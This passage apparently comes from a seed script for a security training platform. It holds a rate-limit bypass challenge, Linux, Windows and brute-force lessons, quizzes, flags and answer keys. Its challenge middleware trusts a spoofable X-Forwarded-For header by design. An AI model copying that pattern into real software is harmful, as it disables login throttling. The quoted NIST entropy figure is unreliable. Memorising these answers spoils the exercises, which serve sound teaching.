    title: "Rate Limit Bypass Challenge",
    description:
      "An API endpoint has rate limiting, but it's implemented incorrectly. Find the bypass and extract the flag from the protected resource.",
    category: "NETWORK_SECURITY",
    difficulty: "ADVANCED",
    sandboxType: "DOCKER",
    points: 200,
    solutionHash: "91f758878e754056bd4843d34e6cf1b9f9aed44c0f78e37cd13897355e08cc87",
    instructions:
      "A web API uses IP-based rate limiting on its login endpoint, but the implementation has a flaw.\n\n**Objective:** Analyze the rate limiter configuration and find the bypass technique. The flag is hidden in the analysis.\n\nCommon rate limit bypass techniques include:\n- X-Forwarded-For header manipulation\n- X-Real-IP spoofing\n- Distributed requests\n- Endpoint path variations\n\n**Available commands:** ls, cat, grep, find, head, tail\n\n**Tips:**\n- Examine the server configuration files\n- Look for how the rate limiter identifies clients\n- The bypass technique reveals the flag\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "head", "tail", "cd", "pwd", "echo", "strings"],
        initScript:
          "mkdir -p /challenges/server/config /challenges/server/logs /challenges/server/src && echo 'const rateLimit = require(\"express-rate-limit\");\\n\\n// Rate limiter configuration\\nconst loginLimiter = rateLimit({\\n  windowMs: 15 * 60 * 1000,\\n  max: 5,\\n  // BUG: Using X-Forwarded-For without validation\\n  // An attacker can bypass by setting a fake X-Forwarded-For header\\n  keyGenerator: (req) => {\\n    return req.headers[\"x-forwarded-for\"] || req.ip;\\n    // FLAG{r4t3_l1m1t_byp4ss3d}\\n  },\\n  message: \"Too many login attempts\",\\n});' > /challenges/server/src/middleware.js && echo 'server {\\n  listen 80;\\n  # WARNING: No X-Forwarded-For validation\\n  # Proxy does not strip client-provided headers\\n  location /api/ {\\n    proxy_pass http://backend:3000;\\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\\n  }\\n}' > /challenges/server/config/nginx.conf && echo '2024-01-15 10:00:01 Rate limited: 192.168.1.50 (5 attempts in 2 min)\\n2024-01-15 10:00:30 Login attempt from X-Forwarded-For: 10.10.10.1 - SUCCESS\\n2024-01-15 10:00:31 Login attempt from X-Forwarded-For: 10.10.10.2 - SUCCESS\\n2024-01-15 10:00:32 Login attempt from X-Forwarded-For: 10.10.10.3 - SUCCESS\\n2024-01-15 10:01:00 ALERT: Possible rate limit bypass - rotating X-Forwarded-For headers detected' > /challenges/server/logs/access.log && echo '# Server Investigation\\n# Analyze the server configuration and source code\\n# Find how the rate limiter can be bypassed' > /challenges/README.txt",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "91f758878e754056bd4843d34e6cf1b9f9aed44c0f78e37cd13897355e08cc87" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Start with /challenges/README.txt, then examine the server source code in /challenges/server/src/.", pointCost: 15 },
        { orderIndex: 1, content: "The rate limiter uses X-Forwarded-For for client identification. Check /challenges/server/src/middleware.js.", pointCost: 25 },
        { orderIndex: 2, content: "The flag is in the keyGenerator comment in middleware.js. The bypass: set a fake X-Forwarded-For header.", pointCost: 40 },
      ],
    },
  });

  console.log(`\nSeeded 14 challenges successfully.`);

  console.log("\nSeeding training courses...");

  const linuxCourse = await prisma.trainingCourse.upsert({
    where: { slug: "linux-fundamentals" },
    update: {},
    create: {
      slug: "linux-fundamentals",
      title: "Linux Fundamentals",
      description: "Master Linux basics in a hands-on terminal-driven environment. Learn filesystem navigation, file operations, process management, and log analysis.",
      category: "Linux Fundamentals",
      level: "Beginner",
      estimatedDuration: "6 hours",
      status: "ACTIVE",
      orderIndex: 1,
      maxXp: 800,
      certificateFlag: true,
      modules: {
        create: [
          {
            title: "Linux Basics",
            description: "Filesystem structure, paths, and basic navigation commands.",
            orderIndex: 0,
            lessons: {
              create: [
                {
                  title: "Filesystem Structure",
                  orderIndex: 0,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "The Linux Filesystem Hierarchy" },
                    { type: "text", content: "Linux organizes all files and directories under a single root directory (/). Understanding this hierarchy is essential for system navigation and administration." },
                    { type: "list", items: ["/home - User home directories", "/etc - System configuration files", "/var - Variable data like logs", "/tmp - Temporary files", "/bin - Essential user binaries"] },
                  ],
                  quizzes: {
                    create: [
                      { question: "What is the root directory in Linux?", options: ["/", "/root", "/home", "C:\\"], correctAnswer: "/", explanation: "The root directory (/) is the top of the Linux filesystem hierarchy.", xpReward: 15, orderIndex: 0 },
                      { question: "Where are system configuration files typically stored?", options: ["/etc", "/bin", "/tmp", "/home"], correctAnswer: "/etc", explanation: "The /etc directory contains system-wide configuration files.", xpReward: 15, orderIndex: 1 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Explore the Filesystem",
                        description: "Navigate the Linux filesystem and locate key directories.",
                        labType: "LINUX_TERMINAL",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-fs-1", description: "List the contents of the root directory", type: "COMMAND_EXECUTION", validationRule: { expectedPattern: "home.*etc.*var" }, xpValue: 15, hints: ["Use the ls command on /", "Try: ls /"] },
                          { id: "obj-fs-2", description: "Find the hidden secret token file", type: "FILE_DISCOVERY", validationRule: { filePath: "/challenges/.hidden/.secret_token", expectedContent: "FLAG{l1nux_h1dd3n_f1l3}" }, xpValue: 35, hints: ["Hidden files start with a dot", "Use: find /challenges -name '.*' -type f", "Check: /challenges/.hidden/"] },
                        ],
                        sandboxConfig: {
                          initScript: "/usr/local/bin/linux-lab-init.sh",
                        },
                      },
                    ],
                  },
                },
                {
                  title: "Absolute vs Relative Paths",
                  orderIndex: 1,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Understanding Path Types" },
                    { type: "text", content: "Absolute paths start from root (/) and specify the full location. Relative paths start from your current directory." },
                    { type: "code", language: "bash", content: "# Absolute path\ncd /home/user/Documents\n\n# Relative path (from /home/user)\ncd Documents\n\n# Go up one level\ncd .." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which path is an absolute path?", options: ["/var/log/syslog", "../Documents", "./scripts", "Downloads/file.txt"], correctAnswer: "/var/log/syslog", explanation: "Absolute paths start with / and specify the complete path from root.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Navigating with ls, cd, pwd",
                  orderIndex: 2,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Essential Navigation Commands" },
                    { type: "text", content: "Three commands form the foundation of Linux navigation: pwd (print working directory), cd (change directory), and ls (list directory contents)." },
                    { type: "code", language: "bash", content: "pwd              # Show current directory\nls -la           # List all files with details\ncd /var/log      # Navigate to /var/log\nls -lh           # Human-readable file sizes" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does the -a flag do with ls?", options: ["Shows hidden files", "Sorts alphabetically", "Shows file sizes", "Shows only directories"], correctAnswer: "Shows hidden files", explanation: "The -a flag shows all files including hidden ones (dotfiles).", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "File Operations",
            description: "File viewing, creation, and permission management.",
            orderIndex: 1,
            lessons: {
              create: [
                {
                  title: "Viewing and Creating Files",
                  orderIndex: 3,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "File Operations" },
                    { type: "text", content: "Linux provides multiple tools for viewing file contents and creating new files and directories." },
                    { type: "code", language: "bash", content: "cat file.txt     # Display entire file\nless file.txt    # Paginated view\ntouch newfile    # Create empty file\nmkdir -p a/b/c   # Create nested directories\nrm file.txt      # Remove file" },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which command creates nested directories in one step?", options: ["mkdir -p a/b/c", "mkdir a b c", "touch a/b/c", "create -r a/b/c"], correctAnswer: "mkdir -p a/b/c", explanation: "The -p flag creates parent directories as needed.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "File Permissions",
                  orderIndex: 4,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Linux Permission System" },
                    { type: "text", content: "Every file has three permission sets: owner, group, and others. Each set can have read (r=4), write (w=2), and execute (x=1) permissions." },
                    { type: "code", language: "bash", content: "ls -l file.txt\n# -rw-r--r-- 1 user group 1234 Dec 22 file.txt\n#  ^^^^^^^^^  owner group others\n\nchmod 755 script.sh  # rwxr-xr-x\nchmod 600 secret.key # rw-------" },
                    { type: "alert", variant: "warning", content: "Never set permissions to 777 on production files. This gives everyone full access." },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does chmod 644 set?", options: ["rw-r--r--", "rwxr-xr-x", "rw-rw-rw-", "rwx------"], correctAnswer: "rw-r--r--", explanation: "6=rw-, 4=r--, 4=r--. Owner can read/write, group and others can only read.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Permission Investigation",
                        description: "Identify files with misconfigured permissions in the challenges directory.",
                        labType: "LINUX_TERMINAL",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-perm-1", description: "Find the file with world-writable permissions (mode 666)", type: "PERMISSION_CHECK", validationRule: { filePath: "/challenges/level1/public_file.txt", permissionMask: "666" }, xpValue: 25, hints: ["Use ls -la to check permissions", "Check /challenges/level1/"] },
                          { id: "obj-perm-2", description: "Find the config file containing a database password", type: "FILE_DISCOVERY", validationRule: { filePath: "/challenges/level2/config.ini", expectedContent: "Sup3rS3cret!" }, xpValue: 25, hints: ["Search /challenges/level2", "Use grep -r 'password' /challenges/"] },
                        ],
                        sandboxConfig: {
                          initScript: "/usr/local/bin/linux-lab-init.sh",
                        },
                      },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Processes and System Info",
            description: "Process management and system information gathering.",
            orderIndex: 2,
            lessons: {
              create: [
                {
                  title: "Process Management",
                  orderIndex: 5,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Managing Processes" },
                    { type: "text", content: "Understanding running processes is critical for system administration and security analysis." },
                    { type: "code", language: "bash", content: "ps aux          # List all processes\ntop             # Interactive process viewer\nwhoami          # Current username\nid              # User and group IDs" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does 'ps aux' display?", options: ["All running processes with details", "Only user processes", "System logs", "Network connections"], correctAnswer: "All running processes with details", explanation: "ps aux shows all processes (a), including those without a terminal (x), with user-oriented format (u).", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "System Information Commands",
                  orderIndex: 6,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Gathering System Information" },
                    { type: "text", content: "Commands like whoami, id, hostname, and uname reveal important system details useful for security assessments." },
                    { type: "code", language: "bash", content: "whoami           # Current user\nid               # UID, GID, groups\nhostname         # System hostname\nuname -a         # Full system info" },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which command shows UID, GID, and group memberships?", options: ["id", "whoami", "uname", "hostname"], correctAnswer: "id", explanation: "The id command displays the user ID, group ID, and all group memberships.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Logs and Analysis",
            description: "Reading and analyzing system log files.",
            orderIndex: 3,
            lessons: {
              create: [
                {
                  title: "Reading System Logs",
                  orderIndex: 7,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Linux Log Files" },
                    { type: "text", content: "Log files are stored in /var/log and contain crucial information for troubleshooting and security monitoring." },
                    { type: "list", items: ["/var/log/syslog - General system log", "/var/log/auth.log - Authentication events", "/var/log/kern.log - Kernel messages"] },
                    { type: "alert", variant: "info", content: "Always check auth.log for suspicious login attempts during incident response." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which log file records authentication events?", options: ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log", "/var/log/boot.log"], correctAnswer: "/var/log/auth.log", explanation: "auth.log records all authentication-related events including SSH logins and sudo usage.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Searching with grep",
                  orderIndex: 8,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Filtering Content with grep" },
                    { type: "text", content: "grep is the primary tool for searching text patterns in files and command output." },
                    { type: "code", language: "bash", content: "grep 'Failed password' /var/log/auth.log\ngrep -i 'error' syslog     # Case-insensitive\ngrep -c 'Failed' auth.log  # Count matches\ngrep -rn 'flag' /challenges # Recursive with line numbers" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does grep -r do?", options: ["Searches recursively through directories", "Reverses the match", "Shows only file names", "Counts matches"], correctAnswer: "Searches recursively through directories", explanation: "The -r flag makes grep search through all files in directories recursively.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Log Analysis Investigation",
                        description: "Analyze simulated system logs to identify suspicious activity.",
                        labType: "LINUX_TERMINAL",
                        orderIndex: 0,
                        maxXp: 60,
                        minXp: 15,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-log-1", description: "Find the IP address that made multiple failed SSH login attempts", type: "LOG_ANALYSIS", validationRule: { expectedOutput: "192.168.1.200" }, xpValue: 20, hints: ["Check /tmp/lab/logs/syslog.sim", "Use grep to find 'Failed password' entries"] },
                          { id: "obj-log-2", description: "Identify which port was blocked by the firewall", type: "LOG_ANALYSIS", validationRule: { expectedOutput: "4444" }, xpValue: 20, hints: ["Look for UFW BLOCK entries in the syslog", "grep 'UFW BLOCK' /tmp/lab/logs/syslog.sim"] },
                          { id: "obj-log-3", description: "Find the flag hidden in the backup directory", type: "FILE_DISCOVERY", validationRule: { filePath: "/home/hacker/Documents/backup/.flag_backup", expectedContent: "FLAG{d1r_tr33_m4st3r}" }, xpValue: 20, hints: ["Search for hidden files in ~/Documents", "Use find with -name '.*'"] },
                        ],
                        sandboxConfig: {
                          initScript: "/usr/local/bin/linux-lab-init.sh",
                        },
                      },
                    ],
                  },
                },
              ],
            },
          },
        ],
      },
    },
  });
  console.log(`  Created training course: ${linuxCourse.title} (${linuxCourse.id})`);

  const windowsCourse = await prisma.trainingCourse.upsert({
    where: { slug: "windows-fundamentals" },
    update: {},
    create: {
      slug: "windows-fundamentals",
      title: "Windows Fundamentals",
      description: "Learn Windows command line and system concepts in a simulated safe environment. Master file navigation, user management, process inspection, and event log analysis.",
      category: "Windows Fundamentals",
      level: "Beginner",
      estimatedDuration: "5 hours",
      status: "ACTIVE",
      orderIndex: 2,
      maxXp: 700,
      certificateFlag: true,
      modules: {
        create: [
          {
            title: "Windows File System",
            description: "Navigate and explore the Windows filesystem using command line tools.",
            orderIndex: 0,
            lessons: {
              create: [
                {
                  title: "Listing Files with dir",
                  orderIndex: 0,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "The dir Command" },
                    { type: "text", content: "The dir command is the Windows equivalent of ls on Linux. It lists files and directories in the current or specified path." },
                    { type: "code", language: "cmd", content: "dir             :: List current directory\ndir /a          :: Show hidden and system files\ndir /s          :: Recursive listing\ndir /o:s        :: Sort by size" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does dir /a show?", options: ["Hidden and system files", "Only directories", "File attributes", "All drives"], correctAnswer: "Hidden and system files", explanation: "The /a switch shows all files including hidden and system files.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Navigating with cd",
                  orderIndex: 1,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Changing Directories" },
                    { type: "text", content: "The cd command navigates between directories. Windows uses backslashes (\\) as path separators." },
                    { type: "code", language: "cmd", content: "cd               :: Show current directory\ncd ..            :: Go up one level\ncd \\Users        :: Navigate to Users\ncd /d D:\\        :: Change drive and directory" },
                  ],
                  quizzes: {
                    create: [
                      { question: "How do you change both drive and directory in Windows?", options: ["cd /d D:\\folder", "cd D:\\folder", "chdir D:", "drive D:"], correctAnswer: "cd /d D:\\folder", explanation: "The /d switch allows cd to change both the drive letter and the directory.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Directory Trees with tree",
                  orderIndex: 2,
                  maxXp: 20,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Visualizing Directory Structure" },
                    { type: "text", content: "The tree command displays the directory structure in a graphical tree format." },
                    { type: "code", language: "cmd", content: "tree             :: Show directory tree\ntree /f          :: Include files\ntree /a          :: ASCII characters only" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does tree /f display?", options: ["Directories and files", "Only folders", "File sizes", "File permissions"], correctAnswer: "Directories and files", explanation: "The /f switch includes file names in the tree output.", xpReward: 15, orderIndex: 0 },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "User and Permission Concepts",
            description: "Understand Windows user accounts and privilege levels.",
            orderIndex: 1,
            lessons: {
              create: [
                {
                  title: "User Identification",
                  orderIndex: 3,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Identifying Users" },
                    { type: "text", content: "Understanding which user you are running as and their privileges is a critical first step in any security assessment." },
                    { type: "code", language: "cmd", content: "whoami           :: Current user\nwhoami /priv     :: User privileges\nnet user         :: List all users\nnet user admin   :: Details for specific user" },
                    { type: "alert", variant: "warning", content: "Users with SeDebugPrivilege or SeImpersonatePrivilege may be targets for privilege escalation." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which command shows user privileges on Windows?", options: ["whoami /priv", "net user /priv", "user /p", "id"], correctAnswer: "whoami /priv", explanation: "whoami /priv displays security privileges assigned to the current user.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "User Enumeration Lab",
                        description: "Identify users with elevated privileges in the simulated Windows environment.",
                        labType: "WINDOWS_SIMULATION",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-win-user-1", description: "Find the user with Administrator privileges (besides Administrator)", type: "PROCESS_IDENTIFICATION", validationRule: { processName: "svc_backup" }, xpValue: 25, hints: ["Use 'net user' to list all users", "Check each user with 'net user <name>'", "Look for users in the Administrators local group"] },
                          { id: "obj-win-user-2", description: "Find the hidden credential token in the filesystem", type: "FILE_DISCOVERY", validationRule: { filePath: "C:\\Users\\trainee\\.config\\credentials.xml", expectedContent: "FLAG{w1nd0ws_cr3d_f0und}" }, xpValue: 25, hints: ["Check hidden directories in your user profile", "Look in .config folders", "Use: type C:\\Users\\trainee\\.config\\credentials.xml"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
                {
                  title: "Local Group Management",
                  orderIndex: 4,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Windows Groups" },
                    { type: "text", content: "Windows uses groups to manage permissions. The Administrators group has unrestricted access to the system." },
                    { type: "code", language: "cmd", content: "net localgroup                    :: List groups\nnet localgroup Administrators     :: Show admin members" },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which group has unrestricted access on Windows?", options: ["Administrators", "Power Users", "Users", "Remote Desktop Users"], correctAnswer: "Administrators", explanation: "The Administrators group has complete and unrestricted access to the computer.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "System Information",
            description: "Gather system details and inspect running processes.",
            orderIndex: 2,
            lessons: {
              create: [
                {
                  title: "System Details with systeminfo",
                  orderIndex: 5,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Gathering System Information" },
                    { type: "text", content: "The systeminfo command displays detailed configuration information about a computer and its operating system." },
                    { type: "code", language: "cmd", content: "systeminfo       :: Full system details" },
                    { type: "alert", variant: "info", content: "systeminfo reveals patch levels, domain membership, and network configuration - all valuable for security assessments." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Why is systeminfo valuable in security assessments?", options: ["It reveals patch levels and system configuration", "It shows passwords", "It lists vulnerabilities", "It creates reports"], correctAnswer: "It reveals patch levels and system configuration", explanation: "systeminfo shows installed hotfixes, OS version, and network details that help identify potential attack vectors.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Inspecting Processes with tasklist",
                  orderIndex: 6,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Process Inspection" },
                    { type: "text", content: "tasklist shows currently running processes. Identifying suspicious processes is key to detecting malware." },
                    { type: "code", language: "cmd", content: "tasklist         :: List all processes\ntasklist /svc    :: Show services\ntasklist /fi \"USERNAME eq SYSTEM\"  :: Filter by user" },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which is a suspicious sign in tasklist output?", options: ["Unknown executables running as SYSTEM", "svchost.exe running as SYSTEM", "explorer.exe running as current user", "cmd.exe in Console session"], correctAnswer: "Unknown executables running as SYSTEM", explanation: "Unknown executables running as SYSTEM could indicate malware or unauthorized access.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Suspicious Process Hunt",
                        description: "Identify abnormal processes and suspicious activity in the simulated Windows system.",
                        labType: "WINDOWS_SIMULATION",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-win-proc-1", description: "Identify the suspicious executable running as SYSTEM", type: "PROCESS_IDENTIFICATION", validationRule: { processName: "shell.exe" }, xpValue: 25, hints: ["Use tasklist to view running processes", "Look for unusual executables running as NT AUTHORITY\\SYSTEM"] },
                          { id: "obj-win-proc-2", description: "Find evidence of the attack in the Temp directory", type: "FILE_DISCOVERY", validationRule: { filePath: "C:\\Temp\\debug.log", expectedContent: "Reverse shell established" }, xpValue: 25, hints: ["Check C:\\Temp for suspicious files", "Use: type C:\\Temp\\debug.log"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Log and Event Review",
            description: "Analyze Windows event logs to detect suspicious activity.",
            orderIndex: 3,
            lessons: {
              create: [
                {
                  title: "Windows Event Logs",
                  orderIndex: 7,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Understanding Event Logs" },
                    { type: "text", content: "Windows Event Viewer categorizes logs into Security, Application, and System. Key security events include logons (4624), failed logons (4625), and privilege escalation (4672)." },
                    { type: "list", items: ["Event ID 4624 - Successful logon", "Event ID 4625 - Failed logon", "Event ID 4672 - Special privileges assigned", "Event ID 4688 - New process created"] },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which Event ID indicates a successful logon?", options: ["4624", "4625", "4672", "4688"], correctAnswer: "4624", explanation: "Event ID 4624 is logged when an account successfully logs on to the system.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Identifying Suspicious Log Entries",
                  orderIndex: 8,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Log Analysis for Incident Response" },
                    { type: "text", content: "During incident response, focus on unusual logon times, logons from unexpected sources, privilege escalation events, and new process creation from suspicious locations." },
                    { type: "alert", variant: "danger", content: "Multiple failed logons followed by a successful one from the same source often indicates a brute force attack." },
                  ],
                  quizzes: {
                    create: [
                      { question: "What pattern suggests a brute force attack in logs?", options: ["Multiple failed logons followed by success from same IP", "A single successful logon", "Regular scheduled task execution", "Normal service startup"], correctAnswer: "Multiple failed logons followed by success from same IP", explanation: "A sequence of failed attempts followed by a success from the same source is a classic brute force signature.", xpReward: 25, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Windows Log Investigation",
                        description: "Analyze simulated Windows event logs to trace a security incident.",
                        labType: "WINDOWS_SIMULATION",
                        orderIndex: 0,
                        maxXp: 60,
                        minXp: 15,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-win-log-1", description: "Find the suspicious process created by Administrator at 02:15", type: "LOG_ANALYSIS", validationRule: { expectedOutput: "shell.exe" }, xpValue: 20, hints: ["Review security event logs", "Look for Event ID 4688 entries"] },
                          { id: "obj-win-log-2", description: "Identify the time of the initial suspicious Administrator logon", type: "LOG_ANALYSIS", validationRule: { expectedPattern: "02:14" }, xpValue: 20, hints: ["Look for Event ID 4624 for Administrator", "Check events around 02:00-03:00"] },
                          { id: "obj-win-log-3", description: "Find the credential stored in the hidden config file", type: "FILE_DISCOVERY", validationRule: { filePath: "C:\\Users\\trainee\\Documents\\config.ini", expectedContent: "S3cretP@ss!" }, xpValue: 20, hints: ["Check Documents folder", "Look for configuration files"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
              ],
            },
          },
        ],
      },
    },
  });
  console.log(`  Created training course: ${windowsCourse.title} (${windowsCourse.id})`);

  const bruteForceCourse = await prisma.trainingCourse.upsert({
    where: { slug: "bruteforce-concepts" },
    update: {},
    create: {
      slug: "bruteforce-concepts",
      title: "Brute Force Concepts",
      description: "Understand brute force attack theory, detection, and mitigation through safe educational simulations. Defense-first approach with no real attack execution.",
      category: "Brute Force",
      level: "Intermediate",
      estimatedDuration: "4 hours",
      status: "ACTIVE",
      orderIndex: 3,
      maxXp: 600,
      certificateFlag: true,
      modules: {
        create: [
          {
            title: "Password Entropy and Complexity",
            description: "Understand how password strength is measured and why complexity matters.",
            orderIndex: 0,
            lessons: {
              create: [
                {
                  title: "Understanding Password Entropy",
                  orderIndex: 0,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Password Entropy" },
                    { type: "text", content: "Entropy measures the unpredictability of a password. Higher entropy means more possible combinations and longer crack times. Entropy = length * log2(charset_size)." },
                    { type: "code", language: "python", content: "import math\n\ndef password_entropy(length, charset_size):\n    return length * math.log2(charset_size)\n\n# Lowercase only: 26 chars\nprint(password_entropy(8, 26))   # 37.6 bits\n# Mixed case + digits + symbols: 95 chars\nprint(password_entropy(14, 95))  # 91.9 bits" },
                    { type: "alert", variant: "info", content: "NIST recommends passwords with at least 80 bits of entropy for sensitive accounts." },
                  ],
                  quizzes: {
                    create: [
                      { question: "What does higher password entropy indicate?", options: ["More possible combinations and harder to crack", "Shorter password", "Easier to remember", "Fewer special characters"], correctAnswer: "More possible combinations and harder to crack", explanation: "Higher entropy means the password has more randomness and is exponentially harder to guess.", xpReward: 20, orderIndex: 0 },
                      { question: "An 8-character lowercase password uses a charset of 26. What is its entropy?", options: ["37.6 bits", "26 bits", "64 bits", "8 bits"], correctAnswer: "37.6 bits", explanation: "Entropy = 8 * log2(26) = 8 * 4.7 = 37.6 bits.", xpReward: 25, orderIndex: 1 },
                    ],
                  },
                },
                {
                  title: "Password Policy Design",
                  orderIndex: 1,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Designing Effective Policies" },
                    { type: "text", content: "Modern password policies favor length over complexity. A 16-character passphrase is stronger than an 8-character complex password." },
                    { type: "list", items: ["Minimum 12 characters recommended", "Check against breach databases (Have I Been Pwned)", "Avoid composition rules that lead to predictable patterns", "Use passphrases: 'correct horse battery staple'"] },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which is generally more secure?", options: ["A 16-character passphrase", "An 8-character password with symbols", "A 6-character random password", "Any password with a number"], correctAnswer: "A 16-character passphrase", explanation: "Length contributes more to entropy than charset complexity. Longer passphrases have more total bits of entropy.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Password Strength Analysis",
                        description: "Use the password analyzer to compare weak, medium, and strong passwords.",
                        labType: "BRUTE_FORCE_SIMULATION",
                        orderIndex: 0,
                        maxXp: 40,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-bf-pw-1", description: "What is the estimated crack time for a 6-character lowercase password at 1 billion attempts/second?", type: "PASSWORD_ANALYSIS", validationRule: { expectedPattern: "second" }, xpValue: 20, hints: ["Calculate: 26^6 / 1,000,000,000", "26^6 = 308,915,776"] },
                          { id: "obj-bf-pw-2", description: "What is the minimum recommended entropy in bits for sensitive accounts per NIST?", type: "PASSWORD_ANALYSIS", validationRule: { expectedOutput: "80" }, xpValue: 20, hints: ["NIST SP 800-63B provides guidance", "The answer is a round number"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Rate Limiting and Lockout Systems",
            description: "Learn defensive mechanisms that slow or prevent brute force attacks.",
            orderIndex: 1,
            lessons: {
              create: [
                {
                  title: "Rate Limiting Authentication",
                  orderIndex: 2,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Rate Limiting" },
                    { type: "text", content: "Rate limiting restricts the number of authentication attempts within a time window. This is one of the most effective defenses against brute force attacks." },
                    { type: "code", language: "typescript", content: "const rateLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5,                    // 5 attempts\n  message: 'Too many login attempts',\n  keyGenerator: (req) => req.ip,\n});" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What is the primary purpose of rate limiting on login endpoints?", options: ["Prevent automated brute force attacks", "Improve page load speed", "Reduce database size", "Log user activity"], correctAnswer: "Prevent automated brute force attacks", explanation: "Rate limiting slows down automated attacks by restricting how many attempts can be made per time window.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Account Lockout Strategies",
                  orderIndex: 3,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Account Lockout Mechanisms" },
                    { type: "text", content: "Account lockout temporarily disables an account after consecutive failed attempts. Progressive lockout increases the lockout duration with each cycle." },
